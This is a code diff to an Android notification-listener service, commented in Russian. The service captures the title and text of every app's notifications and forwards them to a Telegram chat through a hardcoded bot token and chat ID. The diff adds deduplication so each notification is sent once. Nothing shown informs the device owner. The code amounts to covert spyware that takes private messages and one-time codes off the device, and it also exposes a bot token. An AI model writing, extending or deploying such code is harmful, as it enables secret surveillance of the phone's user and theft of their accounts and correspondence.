@@ -1,16 +1,18 @@
-package com.mark.app;
-
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.HashSet;
 
 public class NotificationService extends NotificationListenerService {
 
     private final String TOKEN = "8134845868:AAHvlP0Dewspgk5RT5-qg75iA3pendMztHA";
     private final String CHAT_ID = "7797248765";
+
+    // Хранит ID уведомлений, которые уже отправили
+    private final HashSet<String> sentNotifications = new HashSet<>();
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
@@ -22,8 +24,15 @@ public class NotificationService extends NotificationListenerService {
         String text = textCs != null ? textCs.toString() : "";
 
         if (!text.isEmpty()) {
-            String message = "[" + packageName + "] " + title + ": " + text;
-            sendToTelegram(message);
+            // Формируем уникальный ключ для уведомления
+            String uniqueKey = packageName + "|" + title + "|" + text;
+
+            // Проверяем, отправляли ли уже это уведомление
+            if (!sentNotifications.contains(uniqueKey)) {
+                sentNotifications.add(uniqueKey);
+                String message = "[" + packageName + "] " + title + ": " + text;
+                sendToTelegram(message);
+            }
         }
     }
 
